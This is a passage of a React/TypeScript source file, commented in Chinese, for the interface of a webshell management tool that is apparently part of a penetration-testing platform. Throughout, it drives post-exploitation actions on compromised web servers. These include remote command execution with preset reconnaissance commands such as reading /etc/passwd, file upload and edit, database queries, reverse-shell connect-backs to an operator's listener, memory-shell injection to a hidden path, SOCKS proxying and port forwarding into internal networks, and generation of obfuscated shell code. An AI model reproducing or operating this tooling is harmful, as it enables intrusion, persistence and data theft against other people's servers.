import { useState, useRef, useEffect, useCallback } from 'react'
import {
  Terminal, FolderOpen, Server, Plus, Trash2, Wifi,
  ChevronRight, RefreshCw, Copy, Check, File, Folder,
  ArrowLeft, X, Code2, Shield, AlertCircle, Download,
  Database, Play, Square, Upload, Hash, FolderPlus,
  Edit3, Send, ZapOff, Zap, RotateCcw, Settings,
  FileCode, FileMinus, Globe, Network, Cpu, Plug,
  Radio, ArrowLeftRight, Clock,
} from 'lucide-react'
import { engineGet, enginePost, engineRequest } from '@/lib/engine'

const CAP = 'webshell'

// ── 类型 ────────────────────────────────────────────────────────────────────

interface Shell {
  id: string; url: string; shellType: string; protocol: string; note: string
  status: 'unknown' | 'online' | 'offline'
  osInfo: string; serverInfo: string; phpVersion: string
  cwd: string; runUser: string; hostname: string; serverIp: string
  createdAt: string; lastSeen?: string
}

const PROTOCOL_LABELS: Record<string, string> = {
  behinder_v3:       '冰蝎V3',
  behinder_v4:       '冰蝎V4',
  godzilla_php_aes:  '哥斯拉',
  default_aes:       'AES',
  default_aes_form:  'FORM',
  default_xor:       'XOR',
  default_xor_base64:'XOR+B64',
  default_image:     'IMAGE',
  default_json:      'JSON',
  aes_with_magic:    'MAGIC',
  aes_gcm:           'GCM',
}

interface FileEntry {
  name: string; isDir: boolean; size: number; mtime: number; perms: string
}

interface TermLine {
  type: 'input' | 'output' | 'error' | 'system'; text: string
}

type Tab = 'info' | 'cmd' | 'vterm' | 'files' | 'db' | 'rshell' | 'eval' | 'code' | 'socks' | 'portmap' | 'memshell' | 'plugin' | 'transfer' | 'bshell' | 'revportmap'

// ── 工具 ────────────────────────────────────────────────────────────────────

function fmtSize(n: number) {
  if (n < 1024) return `${n} B`
  if (n < 1048576) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1048576).toFixed(1)} MB`
}
function fmtTime(ts: number) {
  if (!ts) return '—'
  return new Date(ts * 1000).toLocaleString('zh-CN')
}

const TYPE_COLORS: Record<string, string> = {
  php:    'text-violet-400  bg-violet-400/10  border-violet-400/30',
  jsp:    'text-amber-400   bg-amber-400/10   border-amber-400/30',
  aspx:   'text-sky-400     bg-sky-400/10     border-sky-400/30',
  asp:    'text-orange-400  bg-orange-400/10  border-orange-400/30',
  python: 'text-emerald-400 bg-emerald-400/10 border-emerald-400/30',
}

const ACTIVE_TYPES = new Set(['php', 'asp', 'jsp', 'aspx', 'python'])
const JSP_ASPX_PARTIAL = new Set<string>() // 所有类型均已支持主动连接

// 各 shell 类型支持的 Tab 白名单（未列出的 tab 灰显禁用）
const SHELL_TAB_CAPS: Record<string, ReadonlySet<string>> = {
  php:    new Set(['info','cmd','vterm','files','db','rshell','eval','socks','portmap','memshell','plugin','code','transfer','bshell','revportmap']),
  asp:    new Set(['info','cmd','files','rshell','code']),
  jsp:    new Set(['info','cmd','files','db','rshell','code','memshell']),
  aspx:   new Set(['info','cmd','files','db','rshell','code','memshell']),
  python: new Set(['info','cmd','files','db','rshell','code']),
}

const PRESET_CMDS = [
  'whoami', 'id', 'uname -a', 'hostname', 'pwd',
  'cat /etc/passwd', 'ifconfig', 'netstat -antp', 'ps aux', 'env',
  'ipconfig', 'systeminfo', 'tasklist', 'net user',
]

// ── 主组件 ──────────────────────────────────────────────────────────────────

export default function WebshellView() {
  const [shells, setShells] = useState<Shell[]>([])
  const [loading, setLoading] = useState(true)
  const [selected, setSelected] = useState<Shell | null>(null)
  const [tab, setTab] = useState<Tab>('info')

  // 命令终端
  const [termLines, setTermLines] = useState<TermLine[]>([])
  const [cmd, setCmd] = useState('')
  const [execing, setExecing] = useState(false)
  const termRef = useRef<HTMLDivElement>(null)
  const cmdHistRef = useRef<string[]>([])
  const cmdHistIdxRef = useRef(-1)

  // 虚拟终端 (RealCMD)
  const [vtermOutput, setVtermOutput] = useState('')
  const [vtermInput, setVtermInput] = useState('')
  const [vtermRunning, setVtermRunning] = useState(false)
  const [vtermShell, setVtermShell] = useState('/bin/bash')
  const vtermRef = useRef<HTMLDivElement>(null)
  const vtermPollerRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // 文件管理
  const [files, setFiles] = useState<FileEntry[]>([])
  const [filePath, setFilePath] = useState('/')
  const [loadingFiles, setLoadingFiles] = useState(false)
  const [editFile, setEditFile] = useState<{ path: string; content: string } | null>(null)
  const [pathHistory, setPathHistory] = useState<string[]>(['/'])
  const [renameItem, setRenameItem] = useState<{ path: string; name: string } | null>(null)
  const [renameNew, setRenameNew] = useState('')
  const [mkdirName, setMkdirName] = useState('')
  const [showMkdir, setShowMkdir] = useState(false)
  const uploadRef = useRef<HTMLInputElement>(null)

  // 数据库
  const [dbType, setDbType] = useState('mysql')
  const [dbHost, setDbHost] = useState('127.0.0.1')
  const [dbPort, setDbPort] = useState('3306')
  const [dbUser, setDbUser] = useState('root')
  const [dbPass, setDbPass] = useState('')
  const [dbName, setDbName] = useState('')
  const [dbSQL, setDbSQL] = useState('SELECT 1')
  const [dbRunning, setDbRunning] = useState(false)
  const [dbResult, setDbResult] = useState<{ headers: string[]; rows: string[][] } | null>(null)
  const [dbError, setDbError] = useState('')

  // 反弹Shell
  const [cbType, setCbType] = useState('shell')
  const [cbIP, setCbIP] = useState('')
  const [cbPort, setCbPort] = useState('4444')
  const [cbRunning, setCbRunning] = useState(false)
  const [cbMsg, setCbMsg] = useState('')

  // 代码执行
  const [evalCode, setEvalCode] = useState('echo phpinfo();')
  const [evalOutput, setEvalOutput] = useState('')
  const [evalRunning, setEvalRunning] = useState(false)

  // SOCKS5 代理
  const [socksPort, setSocksPort] = useState('1080')
  const [socksRunning, setSocksRunning] = useState(false)
  const [socksConns, setSocksConns] = useState(0)

  // 端口映射
  const [pmLocalPort, setPmLocalPort] = useState('8080')
  const [pmTargetHost, setPmTargetHost] = useState('127.0.0.1')
  const [pmTargetPort, setPmTargetPort] = useState('80')
  const [pmRunning, setPmRunning] = useState(false)
  const [pmConns, setPmConns] = useState(0)

  // 内存马
  const [memShellType, setMemShellType] = useState('shutdown')
  const [memShellPath, setMemShellPath] = useState('/tmp/.cache.php')
  const [memShellCode, setMemShellCode] = useState('')
  const [memShellMsg, setMemShellMsg] = useState('')

  // 插件
  const [pluginCode, setPluginCode] = useState('')
  const [pluginOutput, setPluginOutput] = useState('')
  const [pluginRunning, setPluginRunning] = useState(false)

  // 插件异步模式
  const [pluginAsync, setPluginAsync] = useState(false)
  const [pluginTaskId, setPluginTaskId] = useState('')
  const [pluginPolling, setPluginPolling] = useState(false)
  const pluginPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Transfer 内网穿透
  const [transferMode, setTransferMode] = useState<'http' | 'tcp'>('http')
  const [transferMethod, setTransferMethod] = useState('GET')
  const [transferURL, setTransferURL] = useState('')
  const [transferHeaders, setTransferHeaders] = useState('')
  const [transferBody, setTransferBody] = useState('')
  const [transferHost, setTransferHost] = useState('')
  const [transferPort, setTransferPort] = useState('80')
  const [transferPayload, setTransferPayload] = useState('')
  const [transferResponse, setTransferResponse] = useState('')
  const [transferRunning, setTransferRunning] = useState(false)

  // BShell 绑定Shell管理
  const [bshellPort, setBshellPort] = useState('4444')
  const [bshellSessions, setBshellSessions] = useState<string[]>([])
  const [bshellSelected, setBshellSelected] = useState('')
  const [bshellInput, setBshellInput] = useState('')
  const [bshellOutput, setBshellOutput] = useState('')
  const bshellPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // ReversePortMap 反向端口映射
  const [rpmPort, setRpmPort] = useState('8888')
  const [rpmSessions, setRpmSessions] = useState<string[]>([])
  const [rpmSelected, setRpmSelected] = useState('')
  const [rpmInput, setRpmInput] = useState('')
  const [rpmOutput, setRpmOutput] = useState('')
  const rpmPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // Shell代码（获取Shell标签，依赖已选Shell）
  const [shellCode, setShellCode] = useState('')
  const [codeType, setCodeType] = useState('php')
  const [copied, setCopied] = useState(false)
  const [codeObfuscate, setCodeObfuscate] = useState(false)

  // 独立Shell代码生成器（无需已存在的Shell）
  const [codeGenOpen, setCodeGenOpen] = useState(false)
  const [codeGenType, setCodeGenType] = useState('php')
  const [codeGenProtocol, setCodeGenProtocol] = useState('default_aes')
  const [codeGenPassword, setCodeGenPassword] = useState('aegis')
  const [codeGenCode, setCodeGenCode] = useState('')
  const [codeGenDesc, setCodeGenDesc] = useState('')
  const [codeGenLoading, setCodeGenLoading] = useState(false)
  const [codeGenCopied, setCodeGenCopied] = useState(false)
  const [codeGenObfuscate, setCodeGenObfuscate] = useState(false)
  const codeGenTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null)

  // 连接
  const [connecting, setConnecting] = useState(false)

  // 添加弹窗
  const [addOpen, setAddOpen] = useState(false)
  const [form, setForm] = useState({ url: '', shellType: 'php', protocol: 'default_aes', customHeaders: '', password: 'aegis', note: '' })
  const [adding, setAdding] = useState(false)

  // 备注编辑
  const [editNote, setEditNote] = useState(false)
  const [noteText, setNoteText] = useState('')

  // ── 加载 ────────────────────────────────────────────────────────────────

  const loadShells = useCallback(async (autoSelectId?: string) => {
    setLoading(true)
    try {
      const res = await engineGet<{ shells: Shell[] }>(CAP, '/shells')
      const list = res.shells ?? []
      setShells(list)
      if (autoSelectId) {
        const target = list.find(s => s.id === autoSelectId)
        if (target) setSelected(target)
      } else if (list.length > 0 && !selected) {
        setSelected(list[0])
      }
      return list
    } finally {
      setLoading(false)
    }
  }, [selected])

  useEffect(() => { loadShells() }, [])

  useEffect(() => {
    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight
  }, [termLines])

  useEffect(() => {
    if (vtermRef.current) vtermRef.current.scrollTop = vtermRef.current.scrollHeight
  }, [vtermOutput])

  // 切换 shell 时清理状态，并确保当前 tab 在新 shell 类型中受支持
  useEffect(() => {
    stopVterm()
    setTermLines([])
    setVtermOutput('')
    setFiles([])
    setEditFile(null)
    setDbResult(null)
    setDbError('')
    setEvalOutput('')
    setCbMsg('')
    setSocksRunning(false); setSocksConns(0)
    setPmRunning(false); setPmConns(0)
    setMemShellCode(''); setMemShellMsg('')
    setPluginOutput(''); setPluginTaskId(''); setPluginPolling(false)
    if (pluginPollRef.current) { clearInterval(pluginPollRef.current); pluginPollRef.current = null }
    setTransferResponse('')
    setBshellSessions([]); setBshellSelected(''); setBshellOutput('')
    if (bshellPollRef.current) { clearInterval(bshellPollRef.current); bshellPollRef.current = null }
    setRpmSessions([]); setRpmSelected(''); setRpmOutput('')
    if (rpmPollRef.current) { clearInterval(rpmPollRef.current); rpmPollRef.current = null }
    // 当前 tab 不在新 shell 类型的能力集中时回退到 info
    if (selected) {
      const caps = SHELL_TAB_CAPS[selected.shellType]
      if (caps && !caps.has(tab)) setTab('info')
    }
  }, [selected?.id])

  // ── 连接 ────────────────────────────────────────────────────────────────

  async function connectShell(sh: Shell) {
    setConnecting(true)
    appendTerm('system', `正在连接 ${sh.url} …`)
    try {
      const res = await enginePost<{
        status: string; info?: Shell['osInfo'] extends string ? any : any; error?: string
      }>(CAP, `/shells/${sh.id}/connect`, {})
      if (res.status === 'online' && res.info) {
        const info = res.info
        appendTerm('system', '✓ 连接成功')
        appendTerm('output', `OS: ${info.os}  Server: ${info.server}  PHP: ${info.php}`)
        appendTerm('output', `User: ${info.user}@${info.hostname}  CWD: ${info.cwd}  IP: ${info.ip}`)
        await loadShells()
        const updated = {
          ...sh, status: 'online' as const,
          osInfo: info.os, serverInfo: info.server, phpVersion: info.php,
          cwd: info.cwd, runUser: info.user, hostname: info.hostname, serverIp: info.ip,
        }
        setSelected(updated)
        setFilePath(info.cwd || '/')
        setPathHistory([info.cwd || '/'])
        setTab('info')
      } else {
        appendTerm('error', `✗ 连接失败: ${res.error ?? '未知错误'}`)
        await loadShells()
      }
    } catch (e: any) {
      appendTerm('error', `✗ ${e.message}`)
    } finally {
      setConnecting(false)
    }
  }

  // ── 命令终端 ────────────────────────────────────────────────────────────

  function appendTerm(type: TermLine['type'], text: string) {
    setTermLines(prev => [...prev, { type, text }])
  }

  async function runCmd(command: string) {
    const c = command.trim()
    if (!c || !selected) return
    cmdHistRef.current = [c, ...cmdHistRef.current.slice(0, 49)]
    cmdHistIdxRef.current = -1
    appendTerm('input', `[${selected.runUser || 'shell'}@${selected.hostname || selected.url}]$ ${c}`)
    setCmd('')
    setExecing(true)
    try {
      const res = await enginePost<{ ok: boolean; output?: string; error?: string }>(
        CAP, `/shells/${selected.id}/exec`, { cmd: c }
      )
      if (res.ok) {
        const out = (res.output ?? '').trimEnd()
        if (out) out.split('\n').forEach(line => appendTerm('output', line))
        else appendTerm('output', '（无输出）')
      } else {
        appendTerm('error', `执行失败: ${res.error ?? '未知错误'}`)
      }
    } catch (e: any) {
      appendTerm('error', `请求错误: ${e.message}`)
    } finally {
      setExecing(false)
    }
  }

  function handleCmdKey(e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      const idx = cmdHistIdxRef.current + 1
      if (idx < cmdHistRef.current.length) {
        cmdHistIdxRef.current = idx
        setCmd(cmdHistRef.current[idx])
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault()
      const idx = cmdHistIdxRef.current - 1
      if (idx < 0) { cmdHistIdxRef.current = -1; setCmd('') }
      else { cmdHistIdxRef.current = idx; setCmd(cmdHistRef.current[idx]) }
    }
  }

  // ── 虚拟终端 (RealCMD) ──────────────────────────────────────────────────

  function stopVtermPoller() {
    if (vtermPollerRef.current) {
      clearInterval(vtermPollerRef.current)
      vtermPollerRef.current = null
    }
  }

  async function stopVterm() {
    stopVtermPoller()
    if (vtermRunning && selected) {
      try {
        await enginePost(CAP, `/shells/${selected.id}/realcmd/stop`, {})
      } catch (_) {}
    }
    setVtermRunning(false)
  }

  async function startVterm() {
    if (!selected) return
    setVtermOutput('')
    setVtermRunning(false)
    stopVtermPoller()
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/realcmd/create`, { shell: vtermShell }
      )
      if (!res.ok) {
        setVtermOutput(`[错误] ${res.error}\n`)
        return
      }
      setVtermRunning(true)
      setVtermOutput('[虚拟终端已启动]\n')
      // 轮询读取输出
      vtermPollerRef.current = setInterval(async () => {
        try {
          const r = await enginePost<{ ok: boolean; output?: string }>(
            CAP, `/shells/${selected.id}/realcmd/read`, {}
          )
          if (r.ok && r.output) {
            setVtermOutput(prev => prev + r.output)
          }
        } catch (_) {}
      }, 500)
    } catch (e: any) {
      setVtermOutput(`[错误] ${e.message}\n`)
    }
  }

  async function sendVterm() {
    if (!selected || !vtermRunning) return
    const input = vtermInput + '\n'
    setVtermInput('')
    try {
      await enginePost(CAP, `/shells/${selected.id}/realcmd/write`, { cmd: input })
    } catch (e: any) {
      setVtermOutput(prev => prev + `[写入错误] ${e.message}\n`)
    }
  }

  // ── 文件管理 ────────────────────────────────────────────────────────────

  async function listDir(path: string) {
    if (!selected) return
    setLoadingFiles(true)
    try {
      const res = await enginePost<{ ok: boolean; files?: FileEntry[]; error?: string }>(
        CAP, `/shells/${selected.id}/files/list`, { path }
      )
      if (res.ok) { setFiles(res.files ?? []); setFilePath(path) }
      else alert(`列目录失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
    finally { setLoadingFiles(false) }
  }

  function navigateTo(dir: string) {
    const newPath = filePath.endsWith('/') ? filePath + dir : filePath + '/' + dir
    setPathHistory(h => [...h, newPath])
    listDir(newPath)
  }

  function navigateBack() {
    if (pathHistory.length <= 1) return
    const prev = pathHistory[pathHistory.length - 2]
    setPathHistory(h => h.slice(0, -1))
    listDir(prev)
  }

  async function readFile(path: string) {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; content?: string; error?: string }>(
        CAP, `/shells/${selected.id}/files/read`, { path }
      )
      if (res.ok) setEditFile({ path, content: res.content ?? '' })
      else alert(`读取失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function saveFile() {
    if (!selected || !editFile) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/files/write`, { path: editFile.path, content: editFile.content }
      )
      if (res.ok) { setEditFile(null); await listDir(filePath) }
      else alert(`保存失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function deletePath(path: string, name: string) {
    if (!selected || !confirm(`确认删除: ${name}?`)) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/files/delete`, { path }
      )
      if (res.ok) await listDir(filePath)
      else alert(`删除失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function doRename() {
    if (!selected || !renameItem || !renameNew.trim()) return
    const dir = filePath.endsWith('/') ? filePath : filePath + '/'
    const newPath = dir + renameNew.trim()
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/files/rename`, { oldPath: renameItem.path, newPath }
      )
      if (res.ok) { setRenameItem(null); await listDir(filePath) }
      else alert(`重命名失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function doMkdir() {
    if (!selected || !mkdirName.trim()) return
    const dir = filePath.endsWith('/') ? filePath : filePath + '/'
    const path = dir + mkdirName.trim()
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/files/mkdir`, { path }
      )
      if (res.ok) { setMkdirName(''); setShowMkdir(false); await listDir(filePath) }
      else alert(`创建失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function downloadFile(path: string, name: string) {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; content?: string; error?: string }>(
        CAP, `/shells/${selected.id}/files/download`, { path }
      )
      if (res.ok && res.content) {
        const bytes = Uint8Array.from(atob(res.content), c => c.charCodeAt(0))
        const blob = new Blob([bytes])
        const url = URL.createObjectURL(blob)
        const a = document.createElement('a')
        a.href = url; a.download = name; a.click()
        URL.revokeObjectURL(url)
      } else { alert(`下载失败: ${res.error}`) }
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  async function uploadFile(e: React.ChangeEvent<HTMLInputElement>) {
    const file = e.target.files?.[0]
    if (!file || !selected) return
    const reader = new FileReader()
    reader.onload = async () => {
      const b64 = (reader.result as string).split(',')[1]
      const path = (filePath.endsWith('/') ? filePath : filePath + '/') + file.name
      try {
        const res = await enginePost<{ ok: boolean; error?: string }>(
          CAP, `/shells/${selected.id}/files/upload`, { path, content: b64 }
        )
        if (res.ok) { await listDir(filePath); alert(`上传成功: ${file.name}`) }
        else alert(`上传失败: ${res.error}`)
      } catch (e2: any) { alert(`错误: ${e2.message}`) }
    }
    reader.readAsDataURL(file)
    e.target.value = ''
  }

  async function getHash(path: string) {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; hash?: string; error?: string }>(
        CAP, `/shells/${selected.id}/files/hash`, { path }
      )
      if (res.ok) alert(`MD5: ${res.hash}`)
      else alert(`获取Hash失败: ${res.error}`)
    } catch (e: any) { alert(`错误: ${e.message}`) }
  }

  // ── 数据库 ──────────────────────────────────────────────────────────────

  const DB_PORT_MAP: Record<string, string> = {
    mysql: '3306', postgresql: '5432', sqlserver: '1433', oracle: '1521', sqlite: '',
  }

  function handleDbTypeChange(t: string) {
    setDbType(t)
    setDbPort(DB_PORT_MAP[t] ?? '')
  }

  async function runDBQuery() {
    if (!selected || !dbSQL.trim()) return
    setDbRunning(true); setDbError(''); setDbResult(null)
    try {
      const res = await enginePost<{
        ok: boolean; headers?: string[]; rows?: string[][]; error?: string
      }>(CAP, `/shells/${selected.id}/db/query`, {
        type: dbType, host: dbHost, port: dbPort,
        user: dbUser, pass: dbPass, database: dbName, sql: dbSQL,
      })
      if (res.ok) setDbResult({ headers: res.headers ?? [], rows: res.rows ?? [] })
      else setDbError(res.error ?? '未知错误')
    } catch (e: any) { setDbError(e.message) }
    finally { setDbRunning(false) }
  }

  // ── 反弹Shell ───────────────────────────────────────────────────────────

  async function sendConnectBack() {
    if (!selected || !cbIP || !cbPort) return
    setCbRunning(true); setCbMsg('')
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/connectback`, { type: cbType, ip: cbIP, port: cbPort }
      )
      if (res.ok) setCbMsg('✓ 已发送，请在监听端查看连接')
      else setCbMsg(`✗ 失败: ${res.error}`)
    } catch (e: any) { setCbMsg(`✗ ${e.message}`) }
    finally { setCbRunning(false) }
  }

  // 生成 NC 监听命令
  function ncListen() {
    return `nc -lvnp ${cbPort || 4444}`
  }

  // ── 代码执行 ────────────────────────────────────────────────────────────

  async function runEval() {
    if (!selected || !evalCode.trim()) return
    setEvalRunning(true); setEvalOutput('')
    try {
      const res = await enginePost<{ ok: boolean; output?: string; error?: string }>(
        CAP, `/shells/${selected.id}/eval`, { code: evalCode }
      )
      if (res.ok) setEvalOutput(res.output ?? '（无输出）')
      else setEvalOutput(`[错误] ${res.error}`)
    } catch (e: any) { setEvalOutput(`[错误] ${e.message}`) }
    finally { setEvalRunning(false) }
  }

  // ── Shell代码 ───────────────────────────────────────────────────────────

  async function loadShellCode(id: string, type: string, obfuscate?: boolean) {
    const obs = obfuscate ?? codeObfuscate
    try {
      const res = await engineGet<{ code: string }>(CAP, `/shells/${id}/code?type=${type}${obs ? '&obfuscate=1' : ''}`)
      setShellCode(res.code)
    } catch (e: any) { setShellCode(`// 加载失败: ${e.message}`) }
  }

  async function genStandaloneCode(type: string, protocol: string, password: string, obfuscate?: boolean) {
    const obs = obfuscate ?? codeGenObfuscate
    setCodeGenLoading(true)
    setCodeGenCode('')
    setCodeGenDesc('')
    try {
      const res = await engineGet<{ code: string; description?: string }>(
        CAP,
        `/shells/generate?type=${encodeURIComponent(type)}&password=${encodeURIComponent(password || 'aegis')}&protocol=${encodeURIComponent(protocol)}${obs ? '&obfuscate=1' : ''}`
      )
      setCodeGenCode(res.code)
      setCodeGenDesc(res.description ?? '')
    } catch (e: any) {
      setCodeGenCode(`// 生成失败: ${e.message}`)
    } finally {
      setCodeGenLoading(false)
    }
  }

  useEffect(() => {
    if (!codeGenOpen) return
    if (codeGenTimerRef.current) clearTimeout(codeGenTimerRef.current)
    codeGenTimerRef.current = setTimeout(() => {
      genStandaloneCode(codeGenType, codeGenProtocol, codeGenPassword)
    }, 300)
    return () => { if (codeGenTimerRef.current) clearTimeout(codeGenTimerRef.current) }
  }, [codeGenOpen, codeGenType, codeGenProtocol, codeGenPassword, codeGenObfuscate])

  useEffect(() => {
    if (selected && tab === 'code') loadShellCode(selected.id, codeType)
  }, [selected?.id, tab, codeType])

  useEffect(() => {
    if (selected && tab === 'socks') pollSocksStatus()
  }, [tab, selected?.id])

  useEffect(() => {
    if (selected && tab === 'portmap') pollPortMapStatus()
  }, [tab, selected?.id])

  function copyCode() {
    navigator.clipboard.writeText(shellCode).then(() => {
      setCopied(true); setTimeout(() => setCopied(false), 2000)
    })
  }

  // ── SOCKS5 代理 ──────────────────────────────────────────────────────────

  async function socksStart() {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/socks/start`, { localPort: parseInt(socksPort) }
      )
      if (res.ok) { setSocksRunning(true); pollSocksStatus() }
      else alert(`启动失败: ${res.error}`)
    } catch (e: any) { alert(e.message) }
  }

  async function socksStop() {
    if (!selected) return
    try {
      await enginePost(CAP, `/shells/${selected.id}/socks/stop`, {})
      setSocksRunning(false); setSocksConns(0)
    } catch (e: any) { alert(e.message) }
  }

  async function pollSocksStatus() {
    if (!selected) return
    try {
      const res = await engineGet<{ ok: boolean; status: { running: boolean; activeConns: number } }>(
        CAP, `/shells/${selected.id}/socks/status`
      )
      setSocksRunning(res.status?.running ?? false)
      setSocksConns(res.status?.activeConns ?? 0)
    } catch (_) {}
  }

  // ── 端口映射 ──────────────────────────────────────────────────────────────

  async function portMapStart() {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/portmap/start`, {
          localPort: parseInt(pmLocalPort), targetHost: pmTargetHost, targetPort: pmTargetPort,
        }
      )
      if (res.ok) { setPmRunning(true) }
      else alert(`启动失败: ${res.error}`)
    } catch (e: any) { alert(e.message) }
  }

  async function portMapStop() {
    if (!selected) return
    try {
      await enginePost(CAP, `/shells/${selected.id}/portmap/stop`, {})
      setPmRunning(false); setPmConns(0)
    } catch (e: any) { alert(e.message) }
  }

  async function pollPortMapStatus() {
    if (!selected) return
    try {
      const res = await engineGet<{ ok: boolean; status: { running: boolean; activeConns: number } }>(
        CAP, `/shells/${selected.id}/portmap/status`
      )
      setPmRunning(res.status?.running ?? false)
      setPmConns(res.status?.activeConns ?? 0)
    } catch (_) {}
  }

  // ── 内存马 ────────────────────────────────────────────────────────────────

  async function genMemShell() {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; code?: string; error?: string }>(
        CAP, `/shells/${selected.id}/memshell`, { action: 'generate', shellType: memShellType }
      )
      if (res.ok) setMemShellCode(res.code ?? '')
      else alert(`生成失败: ${res.error}`)
    } catch (e: any) { alert(e.message) }
  }

  async function injectMemShell() {
    if (!selected || !memShellPath.trim()) return
    setMemShellMsg('')
    try {
      const res = await enginePost<{ ok: boolean; path?: string; error?: string }>(
        CAP, `/shells/${selected.id}/memshell`, { action: 'inject', shellType: memShellType, path: memShellPath }
      )
      if (res.ok) setMemShellMsg(`✓ 已写入: ${res.path}`)
      else setMemShellMsg(`✗ ${res.error}`)
    } catch (e: any) { setMemShellMsg(`✗ ${e.message}`) }
  }

  // ── 插件 ──────────────────────────────────────────────────────────────────

  async function runPlugin() {
    if (!selected || !pluginCode.trim()) return
    setPluginRunning(true); setPluginOutput('')
    try {
      const res = await enginePost<{ ok: boolean; output?: string; error?: string }>(
        CAP, `/shells/${selected.id}/plugin`, { code: pluginCode, base64: false }
      )
      if (res.ok) setPluginOutput(res.output ?? '（无输出）')
      else setPluginOutput(`[错误] ${res.error}`)
    } catch (e: any) { setPluginOutput(`[错误] ${e.message}`) }
    finally { setPluginRunning(false) }
  }

  // ── 插件异步模式 ─────────────────────────────────────────────────────────────

  async function submitPlugin() {
    if (!selected || !pluginCode.trim()) return
    setPluginRunning(true); setPluginOutput('')
    try {
      const tid = `task_${Date.now()}`
      const res = await enginePost<{ ok: boolean; taskId?: string; error?: string }>(
        CAP, `/shells/${selected.id}/plugin/submit`, { taskId: tid, code: pluginCode }
      )
      if (!res.ok) { setPluginOutput(`[错误] ${res.error}`); setPluginRunning(false); return }
      const taskId = res.taskId ?? tid
      setPluginTaskId(taskId)
      setPluginPolling(true)
      pluginPollRef.current = setInterval(async () => {
        try {
          const r = await enginePost<{ ok: boolean; running?: boolean; result?: string }>(
            CAP, `/shells/${selected.id}/plugin/result`, { taskId }
          )
          if (r.ok && !r.running) {
            setPluginOutput(r.result ?? '（无输出）')
            setPluginPolling(false); setPluginRunning(false)
            if (pluginPollRef.current) { clearInterval(pluginPollRef.current); pluginPollRef.current = null }
          }
        } catch (_) {}
      }, 1000)
    } catch (e: any) { setPluginOutput(`[错误] ${e.message}`); setPluginRunning(false) }
  }

  async function stopPlugin() {
    if (!selected || !pluginTaskId) return
    try { await enginePost(CAP, `/shells/${selected.id}/plugin/stop`, { taskId: pluginTaskId }) } catch (_) {}
    if (pluginPollRef.current) { clearInterval(pluginPollRef.current); pluginPollRef.current = null }
    setPluginPolling(false); setPluginRunning(false)
  }

  // ── Transfer 内网穿透 ────────────────────────────────────────────────────────

  async function runTransferHTTP() {
    if (!selected || !transferURL.trim()) return
    setTransferRunning(true); setTransferResponse('')
    try {
      const res = await enginePost<{ ok: boolean; response?: string; error?: string }>(
        CAP, `/shells/${selected.id}/transfer/http`, {
          method: transferMethod, url: transferURL,
          headers: transferHeaders, body: transferBody,
        }
      )
      setTransferResponse(res.ok ? (res.response ?? '') : `[错误] ${res.error}`)
    } catch (e: any) { setTransferResponse(`[错误] ${e.message}`) }
    finally { setTransferRunning(false) }
  }

  async function runTransferTCP() {
    if (!selected || !transferHost.trim()) return
    setTransferRunning(true); setTransferResponse('')
    try {
      const res = await enginePost<{ ok: boolean; response?: string; error?: string }>(
        CAP, `/shells/${selected.id}/transfer/tcp`, {
          host: transferHost, port: transferPort, payload: transferPayload,
        }
      )
      setTransferResponse(res.ok ? (res.response ?? '') : `[错误] ${res.error}`)
    } catch (e: any) { setTransferResponse(`[错误] ${e.message}`) }
    finally { setTransferRunning(false) }
  }

  // ── BShell 管理 ─────────────────────────────────────────────────────────────

  async function startBshellListen() {
    if (!selected) return
    try {
      const res = await enginePost<{ ok: boolean; error?: string }>(
        CAP, `/shells/${selected.id}/bshell/listen`, { port: parseInt(bshellPort) }
      )
      if (!res.ok) { alert(`监听失败: ${res.error}`); return }
      setBshellOutput('[等待反弹Shell接入…]\n')
      if (bshellPollRef.current) clearInterval(bshellPollRef.current)
      bshellPollRef.current = setInterval(async () => {
        try {
          const r = await enginePost<{ ok: boolean; sessions?: string[] }>(
            CAP, `/shells/${selected.id}/bshell/list`, {}
          )
          if (r.ok) setBshellSessions(r.sessions ?? [])
        } catch (_) {}
      }, 2000)
    } catch (e: any) { alert(e.message) }
  }

  async function stopBshellListen() {
    if (!selected) return
    try { await enginePost(CAP, `/shells/${selected.id}/bshell/stop`, { port: parseInt(bshellPort) }) } catch (_) {}
    if (bshellPollRef.current) { clearInterval(bshellPollRef.current); bshellPollRef.current = null }
    setBshellSessions([])
  }

  async function bshellSend() {
    if (!selected || !bshellSelected || !bshellInput) return
    const line = bshellInput + '\n'
    setBshellInput('')
    try {
      await enginePost(CAP, `/shells/${selected.id}/bshell/write`, {
